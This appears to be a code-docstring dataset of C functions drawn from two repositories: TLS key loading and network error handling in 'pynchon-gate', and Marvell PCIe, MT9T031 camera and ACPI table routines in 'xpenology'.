{"docstring": "/**\n * Read our TLS certificate and private key from the appropriate files in the workdir.\n *\n * Return 0 on success, -1 on failure.\n */\n", "func_signal": "static int\nload_cert_and_key(const char *workdir, SSL_CTX *ctx)", "code": "{\n        char *certpath, *keypath;\n        certpath = printf_dup(\"%s/keys/tls_cert\", workdir);\n        keypath = printf_dup(\"%s/keys/tls_secret_key\", workdir);\n        if (!certpath || !keypath)\n                /*XXX cleanup*/\n                return -1;\n\n        if (!SSL_CTX_use_certificate_chain_file(ctx, certpath)) {\n                log_error(\"SSL_CTX_use_certificate_chain_file\");\n                return -1; /*XXXX cleanup*/\n        }\n\n        /*XXXX check return */\n        SSL_CTX_set_default_passwd_cb(ctx, pem_passwd_cb);\n        SSL_CTX_set_default_passwd_cb_userdata(ctx, NULL);\n\n        if (!SSL_CTX_use_PrivateKey_file(ctx, keypath, SSL_FILETYPE_PEM)) {\n                log_error(\"SSL_CTX_use_privatekey_file\");\n                return -1; /*XXXX cleanup*/\n        }\n        if (!SSL_CTX_check_private_key(ctx)) {\n                log_error(\"SSL_CTX_check_private_key\");\n                return -1; /*XXXX cleanup*/\n        }\n\n        free(certpath);\n        free(keypath);\n\n        /* Now, let's log our public key and cretificate hashes. */\n        /* XXXX There MUST be a better way to do this. */\n        SSL *ssl_tmp = SSL_new(ctx);\n        EVP_PKEY *key = SSL_get_privatekey(ssl_tmp);\n        uint8_t keydigest[HASH_LEN];\n        if (hash_pubkey(keydigest, key) < 0) {\n                log_error(\"Couldn't compute digest of public key\");\n        } else {\n                char *hex = hexdup(keydigest, HASH_LEN);\n                log_note(\"Public key digest: %s\", hex);\n                free(hex);\n        }\n\n        X509 *cert = SSL_get_certificate(ssl_tmp);\n        if (hash_cert(keydigest, cert) < 0) {\n                log_error(\"Couldn't compute digest of certificate\");\n        } else {\n                char *hex = hexdup(keydigest, HASH_LEN);\n                log_note(\"Certificate digest: %s\", hex);\n                free(hex);\n        }\n\n        /* XXX do I need to free 'key' ? Do I need to free 'cert'? */\n        SSL_free(ssl_tmp);\n\n\n        return 0;\n}", "path": "src\\inverarity\\main.c", "repo_name": "nmathewson/pynchon-gate", "stars": 51, "license": "other", "language": "c", "size": 171}
{"docstring": "/**\n * Send an error message to a client connected on 'conn'.\n *\n * The error code is 'code', and it relates to the request 'req_id'.  The error message is 'msg'.\n *\n * If 'fatal' is true, we can't go on talking to the client: close the connection once the error\n * message is flushed.\n */\n", "func_signal": "static void\nsend_err(struct conn *conn, uint32_t code, const uint8_t *req_id, const char *msg, int fatal)", "code": "{\n        size_t msg_len = strlen(msg);\n        char buf[20];\n        struct bufferevent *bev = conn->bev;\n\n        set_uint32(buf + 0, 0x2002);\n        set_uint32(buf + 4, msg_len + 8);\n        set_uint32(buf + 8, 0); /* flags */\n        set_uint32(buf +12, code);\n        set_uint32(buf +16, msg_len);\n\n        if (req_id) {\n                bufferevent_write(bev, req_id, 32);\n        } else {\n                char tmp[32];\n                memset(tmp, 0, sizeof(tmp));\n                bufferevent_write(bev, tmp, 32);\n        }\n\n        bufferevent_write(bev, buf, 20);\n        bufferevent_write(bev, msg, msg_len);\n\n        if (fatal) {\n                conn->bev = NULL; /* Don't send more replies */\n                bufferevent_setcb(bev, discard_readcb, closeonflush_writecb,\n                                  eventcb, NULL);\n                if (conn->pending_requests == 0)\n                        free_conn(conn);\n        }\n}", "path": "src\\inverarity\\net.c", "repo_name": "nmathewson/pynchon-gate", "stars": 51, "license": "other", "language": "c", "size": 171}
{"docstring": "/*******************************************************************************\n* mvPexLocalDevNumGet - Get PEX interface local device number.\n*\n* DESCRIPTION:\n*       This function gets the local device number of a given PEX interface.\n*\n* INPUT:\n*       pexIf  - PEX interface number.\n*\n* OUTPUT:\n*       None.\n*\n* RETURN:\n*       Local device number. 0xffffffff on Error\n*\n*******************************************************************************/\n", "func_signal": "MV_U32 mvPexLocalDevNumGet(MV_U32 pexIf)", "code": "{\n\tMV_U32 pexStatus;\n\n\t/* Parameter checking   */\n\t\n\tif (PEX_DEFAULT_IF != pexIf)\n\t{\n\t\tif (pexIf >= mvCtrlPexMaxIfGet())\n\t\t{\n\t\t\tmvOsPrintf(\"mvPexLocalDevNumGet: ERR. Invalid PEX interface %d\\n\", \n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t   \t\tpexIf);\n\t\t\treturn 0xFFFFFFFF;\n\t\t}\n\t}\n\t\n\tpexStatus  = MV_REG_READ(PEX_STATUS_REG(pexIf));\n\n\tpexStatus &= PXSR_PEX_DEV_NUM_MASK;\n\n\treturn (pexStatus >> PXSR_PEX_DEV_NUM_OFFS);\n}", "path": "arch\\arm\\plat-feroceon\\mv_hal\\pex\\mvPex.c", "repo_name": "andy928/xpenology", "stars": 56, "license": "other", "language": "c", "size": 117164}
{"docstring": "/*\n * Power Management:\n * COLUMN_ADDRESS_MODE and ROW_ADDRESS_MODE are not rewritten if unchanged\n * they are however changed at reset if the platform hook is present\n * thus we rewrite them with the values stored by the driver\n */\n", "func_signal": "static int mt9t031_runtime_resume(struct device *dev)", "code": "{\n\tstruct video_device *vdev = to_video_device(dev);\n\tstruct v4l2_subdev *sd = soc_camera_vdev_to_subdev(vdev);\n\tstruct i2c_client *client = v4l2_get_subdevdata(sd);\n\tstruct mt9t031 *mt9t031 = to_mt9t031(client);\n\n\tint ret;\n\tu16 xbin, ybin;\n\n\txbin = min(mt9t031->xskip, (u16)3);\n\tybin = min(mt9t031->yskip, (u16)3);\n\n\tret = reg_write(client, MT9T031_COLUMN_ADDRESS_MODE,\n\t\t((xbin - 1) << 4) | (mt9t031->xskip - 1));\n\tif (ret < 0)\n\t\treturn ret;\n\n\tret = reg_write(client, MT9T031_ROW_ADDRESS_MODE,\n\t\t((ybin - 1) << 4) | (mt9t031->yskip - 1));\n\tif (ret < 0)\n\t\treturn ret;\n\n\treturn 0;\n}", "path": "drivers\\media\\video\\mt9t031.c", "repo_name": "andy928/xpenology", "stars": 56, "license": "other", "language": "c", "size": 117164}
{"docstring": "/*******************************************************************************\n* mvPexLocalDevNumSet - Set PEX interface local device number.\n*\n* DESCRIPTION:\n*       This function sets given PEX interface its local device number.\n*       Note: In case the PEX interface is PEX-X, the information is read-only.\n*\n* INPUT:\n*       pexIf  - PEX interface number.\n*       devNum - Device number.\n*\n* OUTPUT:\n*       None.\n*\n* RETURN:\n*       MV_NOT_ALLOWED in case PEX interface is PEX-X. \n*\t\tMV_BAD_PARAM on bad parameters ,\n*       otherwise MV_OK\n*\n*******************************************************************************/\n", "func_signal": "MV_STATUS mvPexLocalDevNumSet(MV_U32 pexIf, MV_U32 devNum)", "code": "{\n\tMV_U32 pexStatus;\n\tMV_U32 localBus;\n\tMV_U32 localDev;\n\n\t/* Parameter checking   */\n\tif (pexIf >= mvCtrlPexMaxIfGet())\n\t{\n\t\tmvOsPrintf(\"mvPexLocalDevNumSet: ERR. Invalid PEX interface %d\\n\",pexIf);\n\t\treturn MV_BAD_PARAM;\n\t}\n\tif (devNum >= MAX_PEX_DEVICES)\n\t{\n\t\tmvOsPrintf(\"mvPexLocalDevNumSet: ERR. device number illigal %d\\n\", \n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t   devNum);\n\t\treturn MV_BAD_PARAM;\n\n\t}\n\t\n\tlocalBus = mvPexLocalBusNumGet(pexIf);\n\tlocalDev = mvPexLocalDevNumGet(pexIf);\n\n\n\tpexStatus  = MV_REG_READ(PEX_STATUS_REG(pexIf));\n\n\tpexStatus &= ~PXSR_PEX_DEV_NUM_MASK;\n\n\tpexStatus |= (devNum << PXSR_PEX_DEV_NUM_OFFS) & PXSR_PEX_DEV_NUM_MASK;\n\n\tMV_REG_WRITE(PEX_STATUS_REG(pexIf), pexStatus);\n\n\n\treturn MV_OK;\n}", "path": "arch\\arm\\plat-feroceon\\mv_hal\\pex\\mvPex.c", "repo_name": "andy928/xpenology", "stars": 56, "license": "other", "language": "c", "size": 117164}
{"docstring": "/*******************************************************************************\n* mvPexSlaveEnable - Enable/disale PEX interface slave transactions.\n*\n* DESCRIPTION:\n*       This function performs read modified write to PEX command status \n*       (offset 0x4) to set/reset bit 0 and 1. After those bits are set, \n*       the PEX slave is allowed to respond to PEX IO space access (bit 0) \n*       and PEX memory space access (bit 1). \n*\n* INPUT:\n*       pexIf  - PEX interface number.\n*       dev     - PEX device number.\n*       enable - Enable/disable parameter.\n*\n* OUTPUT:\n*       None.\n*\n* RETURN:\n*       MV_BAD_PARAM for bad parameters ,MV_ERROR on error ! otherwise MV_OK\n*\n*******************************************************************************/\n", "func_signal": "MV_STATUS mvPexSlaveEnable(MV_U32 pexIf, MV_U32 bus,MV_U32 dev, MV_BOOL enable)", "code": "{\n\tMV_U32 pexCommandStatus;\n\tMV_U32 RegOffs;\n\n\t/* Parameter checking   */\n\tif (pexIf >= mvCtrlPexMaxIfGet())\n\t{\n\t\tmvOsPrintf(\"mvPexSlaveEnable: ERR. Invalid PEX interface %d\\n\", pexIf);\n\t\treturn MV_BAD_PARAM;\n\t}\n\tif (dev >= MAX_PEX_DEVICES)\n\t{\n\t\tmvOsPrintf(\"mvPexLocalDevNumSet: ERR. device number illigal %d\\n\", dev);\n\t\treturn MV_BAD_PARAM;\n\n\t}\n\n\t\n\tRegOffs = PEX_STATUS_AND_COMMAND;\n\t\n\tpexCommandStatus = mvPexConfigRead(pexIf, bus, dev, 0, RegOffs);\n\n    if (MV_TRUE == enable)\n\t{\n\t\tpexCommandStatus |= (PXSAC_IO_EN | PXSAC_MEM_EN);\n\t}\n\telse                             \n\t{\n\t\tpexCommandStatus &= ~(PXSAC_IO_EN | PXSAC_MEM_EN);\n\t}\n\n\tmvPexConfigWrite(pexIf, bus, dev, 0, RegOffs, pexCommandStatus);\n\n\treturn MV_OK;\n\n}", "path": "arch\\arm\\plat-feroceon\\mv_hal\\pex\\mvPex.c", "repo_name": "andy928/xpenology", "stars": 56, "license": "other", "language": "c", "size": 117164}
{"docstring": "/*******************************************************************************\n *\n * FUNCTION:    acpi_load_table\n *\n * PARAMETERS:  table_ptr       - pointer to a buffer containing the entire\n *                                table to be loaded\n *\n * RETURN:      Status\n *\n * DESCRIPTION: This function is called to load a table from the caller's\n *              buffer. The buffer must contain an entire ACPI Table including\n *              a valid header. The header fields will be verified, and if it\n *              is determined that the table is invalid, the call will fail.\n *\n ******************************************************************************/\n", "func_signal": "acpi_status acpi_load_table(struct acpi_table_header *table_ptr)", "code": "{\n\tacpi_status status;\n\tu32 table_index;\n\tstruct acpi_table_desc table_desc;\n\n\tif (!table_ptr)\n\t\treturn AE_BAD_PARAMETER;\n\n\tACPI_MEMSET(&table_desc, 0, sizeof(struct acpi_table_desc));\n\ttable_desc.pointer = table_ptr;\n\ttable_desc.length = table_ptr->length;\n\ttable_desc.flags = ACPI_TABLE_ORIGIN_UNKNOWN;\n\n\t/*\n\t * Install the new table into the local data structures\n\t */\n\tstatus = acpi_tb_add_table(&table_desc, &table_index);\n\tif (ACPI_FAILURE(status)) {\n\t\treturn status;\n\t}\n\tstatus = acpi_ns_load_table(table_index, acpi_gbl_root_node);\n\treturn status;\n}", "path": "drivers\\acpi\\acpica\\tbxface.c", "repo_name": "andy928/xpenology", "stars": 56, "license": "other", "language": "c", "size": 117164}
{"docstring": "/*******************************************************************************\n *\n * FUNCTION:    acpi_get_table_header\n *\n * PARAMETERS:  Signature           - ACPI signature of needed table\n *              Instance            - Which instance (for SSDTs)\n *              out_table_header    - The pointer to the table header to fill\n *\n * RETURN:      Status and pointer to mapped table header\n *\n * DESCRIPTION: Finds an ACPI table header.\n *\n * NOTE:        Caller is responsible in unmapping the header with\n *              acpi_os_unmap_memory\n *\n ******************************************************************************/\n", "func_signal": "acpi_status\nacpi_get_table_header(char *signature,\n\t\t      u32 instance, struct acpi_table_header *out_table_header)", "code": "{\n       u32 i;\n       u32 j;\n\tstruct acpi_table_header *header;\n\n\t/* Parameter validation */\n\n\tif (!signature || !out_table_header) {\n\t\treturn (AE_BAD_PARAMETER);\n\t}\n\n\t/* Walk the root table list */\n\n\tfor (i = 0, j = 0; i < acpi_gbl_root_table_list.current_table_count;\n\t     i++) {\n\t\tif (!ACPI_COMPARE_NAME\n\t\t    (&(acpi_gbl_root_table_list.tables[i].signature),\n\t\t     signature)) {\n\t\t\tcontinue;\n\t\t}\n\n\t\tif (++j < instance) {\n\t\t\tcontinue;\n\t\t}\n\n\t\tif (!acpi_gbl_root_table_list.tables[i].pointer) {\n\t\t\tif ((acpi_gbl_root_table_list.tables[i].flags &\n\t\t\t     ACPI_TABLE_ORIGIN_MASK) ==\n\t\t\t    ACPI_TABLE_ORIGIN_MAPPED) {\n\t\t\t\theader =\n\t\t\t\t    acpi_os_map_memory(acpi_gbl_root_table_list.\n\t\t\t\t\t\t       tables[i].address,\n\t\t\t\t\t\t       sizeof(struct\n\t\t\t\t\t\t\t      acpi_table_header));\n\t\t\t\tif (!header) {\n\t\t\t\t\treturn AE_NO_MEMORY;\n\t\t\t\t}\n\t\t\t\tACPI_MEMCPY(out_table_header, header,\n\t\t\t\t\t    sizeof(struct acpi_table_header));\n\t\t\t\tacpi_os_unmap_memory(header,\n\t\t\t\t\t\t     sizeof(struct\n\t\t\t\t\t\t\t    acpi_table_header));\n\t\t\t} else {\n\t\t\t\treturn AE_NOT_FOUND;\n\t\t\t}\n\t\t} else {\n\t\t\tACPI_MEMCPY(out_table_header,\n\t\t\t\t    acpi_gbl_root_table_list.tables[i].pointer,\n\t\t\t\t    sizeof(struct acpi_table_header));\n\t\t}\n\t\treturn (AE_OK);\n\t}\n\n\treturn (AE_NOT_FOUND);\n}", "path": "drivers\\acpi\\acpica\\tbxface.c", "repo_name": "andy928/xpenology", "stars": 56, "license": "other", "language": "c", "size": 117164}
{"docstring": "/*******************************************************************************\n *\n * FUNCTION:    acpi_install_table_handler\n *\n * PARAMETERS:  Handler         - Table event handler\n *              Context         - Value passed to the handler on each event\n *\n * RETURN:      Status\n *\n * DESCRIPTION: Install table event handler\n *\n ******************************************************************************/\n", "func_signal": "acpi_status\nacpi_install_table_handler(acpi_tbl_handler handler, void *context)", "code": "{\n\tacpi_status status;\n\n\tACPI_FUNCTION_TRACE(acpi_install_table_handler);\n\n\tif (!handler) {\n\t\treturn_ACPI_STATUS(AE_BAD_PARAMETER);\n\t}\n\n\tstatus = acpi_ut_acquire_mutex(ACPI_MTX_EVENTS);\n\tif (ACPI_FAILURE(status)) {\n\t\treturn_ACPI_STATUS(status);\n\t}\n\n\t/* Don't allow more than one handler */\n\n\tif (acpi_gbl_table_handler) {\n\t\tstatus = AE_ALREADY_EXISTS;\n\t\tgoto cleanup;\n\t}\n\n\t/* Install the handler */\n\n\tacpi_gbl_table_handler = handler;\n\tacpi_gbl_table_handler_context = context;\n\n      cleanup:\n\t(void)acpi_ut_release_mutex(ACPI_MTX_EVENTS);\n\treturn_ACPI_STATUS(status);\n}", "path": "drivers\\acpi\\acpica\\tbxface.c", "repo_name": "andy928/xpenology", "stars": 56, "license": "other", "language": "c", "size": 117164}
{"docstring": "/*******************************************************************************\n *\n * FUNCTION:    acpi_allocate_root_table\n *\n * PARAMETERS:  initial_table_count - Size of initial_table_array, in number of\n *                                    struct acpi_table_desc structures\n *\n * RETURN:      Status\n *\n * DESCRIPTION: Allocate a root table array. Used by i_aSL compiler and\n *              acpi_initialize_tables.\n *\n ******************************************************************************/\n", "func_signal": "acpi_status acpi_allocate_root_table(u32 initial_table_count)", "code": "{\n\n\tacpi_gbl_root_table_list.max_table_count = initial_table_count;\n\tacpi_gbl_root_table_list.flags = ACPI_ROOT_ALLOW_RESIZE;\n\n\treturn (acpi_tb_resize_root_table_list());\n}", "path": "drivers\\acpi\\acpica\\tbxface.c", "repo_name": "andy928/xpenology", "stars": 56, "license": "other", "language": "c", "size": 117164}
{"docstring": "/*******************************************************************************\n* mvPexModeGet - Get Pex Mode\n*\n* DESCRIPTION:\n*\n* INPUT:\n*       pexIf   - PEX interface number.\n*\n* OUTPUT:\n*       pexMode - Pex mode structure\n*\n* RETURN:\n*       MV_OK on success , MV_ERROR otherwise\n*\n*******************************************************************************/\n", "func_signal": "MV_U32 mvPexModeGet(MV_U32 pexIf,MV_PEX_MODE *pexMode)", "code": "{\n\tMV_U32 pexData;\n\n\t/* Parameter checking   */\n\tif (PEX_DEFAULT_IF != pexIf)\n\t{\n\t\tif (pexIf >= mvCtrlPexMaxIfGet())\n\t\t{\n\t\t\tmvOsPrintf(\"mvPexModeGet: ERR. Invalid PEX interface %d\\n\",pexIf);\n\t\t\treturn MV_ERROR;\n\t\t}\n\t}\n\n\tpexData = MV_REG_READ(PEX_CTRL_REG(pexIf));\n\n\tswitch (pexData & PXCR_DEV_TYPE_CTRL_MASK)\n\t{\n\tcase PXCR_DEV_TYPE_CTRL_CMPLX:\n\t\tpexMode->pexType = MV_PEX_ROOT_COMPLEX;\n\t\tbreak;\n\tcase PXCR_DEV_TYPE_CTRL_POINT:\n\t\tpexMode->pexType = MV_PEX_END_POINT;\n\t\tbreak;\n\n\t}\n\n    /* Check if we have link */\n    if (MV_REG_READ(PEX_STATUS_REG(pexIf)) & PXSR_DL_DOWN)\n    {\n        pexMode->pexLinkUp = MV_FALSE;\n        \n        /* If there is no link, the auto negotiation data is worthless */\n        pexMode->pexWidth  = MV_PEX_WITDH_INVALID;\n    }   \n    else\n    {\n        pexMode->pexLinkUp = MV_TRUE;\n\n        /* We have link. The link width is now valid */\n        pexData = MV_REG_READ(PEX_CFG_DIRECT_ACCESS(pexIf, PEX_LINK_CTRL_STAT_REG));\n        pexMode->pexWidth = ((pexData & PXLCSR_NEG_LNK_WDTH_MASK) >> \n                             PXLCSR_NEG_LNK_WDTH_OFFS);\n    }\n\n    return MV_OK;\n}", "path": "arch\\arm\\plat-feroceon\\mv_hal\\pex\\mvPex.c", "repo_name": "andy928/xpenology", "stars": 56, "license": "other", "language": "c", "size": 117164}
{"docstring": "/*******************************************************************************\n *\n * FUNCTION:    acpi_unload_table_id\n *\n * PARAMETERS:  id            - Owner ID of the table to be removed.\n *\n * RETURN:      Status\n *\n * DESCRIPTION: This routine is used to force the unload of a table (by id)\n *\n ******************************************************************************/\n", "func_signal": "acpi_status acpi_unload_table_id(acpi_owner_id id)", "code": "{\n\tint i;\n\tacpi_status status = AE_NOT_EXIST;\n\n\tACPI_FUNCTION_TRACE(acpi_unload_table_id);\n\n\t/* Find table in the global table list */\n\tfor (i = 0; i < acpi_gbl_root_table_list.current_table_count; ++i) {\n\t\tif (id != acpi_gbl_root_table_list.tables[i].owner_id) {\n\t\t\tcontinue;\n\t\t}\n\t\t/*\n\t\t * Delete all namespace objects owned by this table. Note that these\n\t\t * objects can appear anywhere in the namespace by virtue of the AML\n\t\t * \"Scope\" operator. Thus, we need to track ownership by an ID, not\n\t\t * simply a position within the hierarchy\n\t\t */\n\t\tacpi_tb_delete_namespace_by_owner(i);\n\t\tstatus = acpi_tb_release_owner_id(i);\n\t\tacpi_tb_set_table_loaded_flag(i, FALSE);\n\t\tbreak;\n\t}\n\treturn_ACPI_STATUS(status);\n}", "path": "drivers\\acpi\\acpica\\tbxface.c", "repo_name": "andy928/xpenology", "stars": 56, "license": "other", "language": "c", "size": 117164}
{"docstring": "/* rect is the sensor rectangle, the caller guarantees parameter validity */\n", "func_signal": "static int mt9t031_set_params(struct i2c_client *client,\n\t\t\t      struct v4l2_rect *rect, u16 xskip, u16 yskip)", "code": "{\n\tstruct mt9t031 *mt9t031 = to_mt9t031(client);\n\tint ret;\n\tu16 xbin, ybin;\n\tconst u16 hblank = MT9T031_HORIZONTAL_BLANK,\n\t\tvblank = MT9T031_VERTICAL_BLANK;\n\n\txbin = min(xskip, (u16)3);\n\tybin = min(yskip, (u16)3);\n\n\t/*\n\t * Could just do roundup(rect->left, [xy]bin * 2); but this is cheaper.\n\t * There is always a valid suitably aligned value. The worst case is\n\t * xbin = 3, width = 2048. Then we will start at 36, the last read out\n\t * pixel will be 2083, which is < 2085 - first black pixel.\n\t *\n\t * MT9T031 datasheet imposes window left border alignment, depending on\n\t * the selected xskip. Failing to conform to this requirement produces\n\t * dark horizontal stripes in the image. However, even obeying to this\n\t * requirement doesn't eliminate the stripes in all configurations. They\n\t * appear \"locally reproducibly,\" but can differ between tests under\n\t * different lighting conditions.\n\t */\n\tswitch (xbin) {\n\tcase 1:\n\t\trect->left &= ~1;\n\t\tbreak;\n\tcase 2:\n\t\trect->left &= ~3;\n\t\tbreak;\n\tcase 3:\n\t\trect->left = rect->left > roundup(MT9T031_COLUMN_SKIP, 6) ?\n\t\t\t(rect->left / 6) * 6 : roundup(MT9T031_COLUMN_SKIP, 6);\n\t}\n\n\trect->top &= ~1;\n\n\tdev_dbg(&client->dev, \"skip %u:%u, rect %ux%u@%u:%u\\n\",\n\t\txskip, yskip, rect->width, rect->height, rect->left, rect->top);\n\n\t/* Disable register update, reconfigure atomically */\n\tret = reg_set(client, MT9T031_OUTPUT_CONTROL, 1);\n\tif (ret < 0)\n\t\treturn ret;\n\n\t/* Blanking and start values - default... */\n\tret = reg_write(client, MT9T031_HORIZONTAL_BLANKING, hblank);\n\tif (ret >= 0)\n\t\tret = reg_write(client, MT9T031_VERTICAL_BLANKING, vblank);\n\n\tif (yskip != mt9t031->yskip || xskip != mt9t031->xskip) {\n\t\t/* Binning, skipping */\n\t\tif (ret >= 0)\n\t\t\tret = reg_write(client, MT9T031_COLUMN_ADDRESS_MODE,\n\t\t\t\t\t((xbin - 1) << 4) | (xskip - 1));\n\t\tif (ret >= 0)\n\t\t\tret = reg_write(client, MT9T031_ROW_ADDRESS_MODE,\n\t\t\t\t\t((ybin - 1) << 4) | (yskip - 1));\n\t}\n\tdev_dbg(&client->dev, \"new physical left %u, top %u\\n\",\n\t\trect->left, rect->top);\n\n\t/*\n\t * The caller provides a supported format, as guaranteed by\n\t * .try_mbus_fmt(), soc_camera_s_crop() and soc_camera_cropcap()\n\t */\n\tif (ret >= 0)\n\t\tret = reg_write(client, MT9T031_COLUMN_START, rect->left);\n\tif (ret >= 0)\n\t\tret = reg_write(client, MT9T031_ROW_START, rect->top);\n\tif (ret >= 0)\n\t\tret = reg_write(client, MT9T031_WINDOW_WIDTH, rect->width - 1);\n\tif (ret >= 0)\n\t\tret = reg_write(client, MT9T031_WINDOW_HEIGHT,\n\t\t\t\trect->height + mt9t031->y_skip_top - 1);\n\tif (ret >= 0 && v4l2_ctrl_g_ctrl(mt9t031->autoexposure) == V4L2_EXPOSURE_AUTO) {\n\t\tmt9t031->total_h = rect->height + mt9t031->y_skip_top + vblank;\n\n\t\tret = set_shutter(client, mt9t031->total_h);\n\t}\n\n\t/* Re-enable register update, commit all changes */\n\tif (ret >= 0)\n\t\tret = reg_clear(client, MT9T031_OUTPUT_CONTROL, 1);\n\n\tif (ret >= 0) {\n\t\tmt9t031->rect = *rect;\n\t\tmt9t031->xskip = xskip;\n\t\tmt9t031->yskip = yskip;\n\t}\n\n\treturn ret < 0 ? ret : 0;\n}", "path": "drivers\\media\\video\\mt9t031.c", "repo_name": "andy928/xpenology", "stars": 56, "license": "other", "language": "c", "size": 117164}
{"docstring": "/* target must be _even_ */\n", "func_signal": "static u16 mt9t031_skip(s32 *source, s32 target, s32 max)", "code": "{\n\tunsigned int skip;\n\n\tif (*source < target + target / 2) {\n\t\t*source = target;\n\t\treturn 1;\n\t}\n\n\tskip = min(max, *source + target / 2) / target;\n\tif (skip > 8)\n\t\tskip = 8;\n\t*source = target * skip;\n\n\treturn skip;\n}", "path": "drivers\\media\\video\\mt9t031.c", "repo_name": "andy928/xpenology", "stars": 56, "license": "other", "language": "c", "size": 117164}
{"docstring": "/*******************************************************************************\n* mvPexLocalBusNumSet - Set PEX interface local bus number.\n*\n* DESCRIPTION:\n*       This function sets given PEX interface its local bus number.\n*       Note: In case the PEX interface is PEX-X, the information is read-only.\n*\n* INPUT:\n*       pexIf  - PEX interface number.\n*       busNum - Bus number.\n*\n* OUTPUT:\n*       None.\n*\n* RETURN:\n*       MV_NOT_ALLOWED in case PEX interface is PEX-X. \n*\t\tMV_BAD_PARAM on bad parameters ,\n*       otherwise MV_OK\n*\n*******************************************************************************/\n", "func_signal": "MV_STATUS mvPexLocalBusNumSet(MV_U32 pexIf, MV_U32 busNum)", "code": "{\n\tMV_U32 pexStatus;\n\tMV_U32 localBus;\n\tMV_U32 localDev;\n\n\n\t/* Parameter checking   */\n\tif (pexIf >= mvCtrlPexMaxIfGet())\n\t{\n\t\tmvOsPrintf(\"mvPexLocalBusNumSet: ERR. Invalid PEX interface %d\\n\",pexIf);\n\t\treturn MV_BAD_PARAM;\n\t}\n\tif (busNum >= MAX_PEX_BUSSES)\n\t{\n\t\tmvOsPrintf(\"mvPexLocalBusNumSet: ERR. bus number illigal %d\\n\", busNum);\n\t\treturn MV_ERROR;\n\n\t}\n\n\tlocalBus = mvPexLocalBusNumGet(pexIf);\n\tlocalDev = mvPexLocalDevNumGet(pexIf);\n\n\n\n\tpexStatus  = MV_REG_READ(PEX_STATUS_REG(pexIf));\n\n\tpexStatus &= ~PXSR_PEX_BUS_NUM_MASK;\n\n\tpexStatus |= (busNum << PXSR_PEX_BUS_NUM_OFFS) & PXSR_PEX_BUS_NUM_MASK;\n\n\tMV_REG_WRITE(PEX_STATUS_REG(pexIf), pexStatus);\n\n\n\treturn MV_OK;\n}", "path": "arch\\arm\\plat-feroceon\\mv_hal\\pex\\mvPex.c", "repo_name": "andy928/xpenology", "stars": 56, "license": "other", "language": "c", "size": 117164}
{"docstring": "/*******************************************************************************\n *\n * FUNCTION:    acpi_get_table_by_index\n *\n * PARAMETERS:  table_index         - Table index\n *              Table               - Where the pointer to the table is returned\n *\n * RETURN:      Status and pointer to the table\n *\n * DESCRIPTION: Obtain a table by an index into the global table list.\n *\n ******************************************************************************/\n", "func_signal": "acpi_status\nacpi_get_table_by_index(u32 table_index, struct acpi_table_header **table)", "code": "{\n\tacpi_status status;\n\n\tACPI_FUNCTION_TRACE(acpi_get_table_by_index);\n\n\t/* Parameter validation */\n\n\tif (!table) {\n\t\treturn_ACPI_STATUS(AE_BAD_PARAMETER);\n\t}\n\n\t(void)acpi_ut_acquire_mutex(ACPI_MTX_TABLES);\n\n\t/* Validate index */\n\n\tif (table_index >= acpi_gbl_root_table_list.current_table_count) {\n\t\t(void)acpi_ut_release_mutex(ACPI_MTX_TABLES);\n\t\treturn_ACPI_STATUS(AE_BAD_PARAMETER);\n\t}\n\n\tif (!acpi_gbl_root_table_list.tables[table_index].pointer) {\n\n\t\t/* Table is not mapped, map it */\n\n\t\tstatus =\n\t\t    acpi_tb_verify_table(&acpi_gbl_root_table_list.\n\t\t\t\t\t tables[table_index]);\n\t\tif (ACPI_FAILURE(status)) {\n\t\t\t(void)acpi_ut_release_mutex(ACPI_MTX_TABLES);\n\t\t\treturn_ACPI_STATUS(status);\n\t\t}\n\t}\n\n\t*table = acpi_gbl_root_table_list.tables[table_index].pointer;\n\t(void)acpi_ut_release_mutex(ACPI_MTX_TABLES);\n\treturn_ACPI_STATUS(AE_OK);\n}", "path": "drivers\\acpi\\acpica\\tbxface.c", "repo_name": "andy928/xpenology", "stars": 56, "license": "other", "language": "c", "size": 117164}
{"docstring": "/*******************************************************************************\n* mvPexMasterEnable - Enable/disale PEX interface master transactions.\n*\n* DESCRIPTION:\n*       This function performs read modified write to PEX command status \n*       (offset 0x4) to set/reset bit 2. After this bit is set, the PEX \n*       master is allowed to gain ownership on the bus, otherwise it is \n*       incapable to do so.\n*\n* INPUT:\n*       pexIf  - PEX interface number.\n*       enable - Enable/disable parameter.\n*\n* OUTPUT:\n*       None.\n*\n* RETURN:\n*       MV_BAD_PARAM for bad parameters ,MV_ERROR on error ! otherwise MV_OK\n*\n*******************************************************************************/\n", "func_signal": "MV_STATUS mvPexMasterEnable(MV_U32 pexIf, MV_BOOL enable)", "code": "{\n\tMV_U32 pexCommandStatus;\n\tMV_U32 localBus;\n\tMV_U32 localDev;\n\n\t/* Parameter checking   */\n\tif (pexIf >= mvCtrlPexMaxIfGet())\n\t{\n\t\tmvOsPrintf(\"mvPexMasterEnable: ERR. Invalid PEX interface %d\\n\", pexIf);\n\t\treturn MV_ERROR;\n\t}\n\n\tlocalBus = mvPexLocalBusNumGet(pexIf);\n\tlocalDev = mvPexLocalDevNumGet(pexIf);\n\t\n\tpexCommandStatus = MV_REG_READ(PEX_CFG_DIRECT_ACCESS(pexIf,\n\t\t\t\t\t\t\t    PEX_STATUS_AND_COMMAND));\n\n\n\tif (MV_TRUE == enable)\n\t{\n\t\tpexCommandStatus |= PXSAC_MASTER_EN;\n\t}\n\telse\n\t{\n\t\tpexCommandStatus &= ~PXSAC_MASTER_EN;\n\t}\n\n\t\n\tMV_REG_WRITE(PEX_CFG_DIRECT_ACCESS(pexIf,PEX_STATUS_AND_COMMAND),\n\t\t\t\t pexCommandStatus);\n\n\treturn MV_OK;\n}", "path": "arch\\arm\\plat-feroceon\\mv_hal\\pex\\mvPex.c", "repo_name": "andy928/xpenology", "stars": 56, "license": "other", "language": "c", "size": 117164}
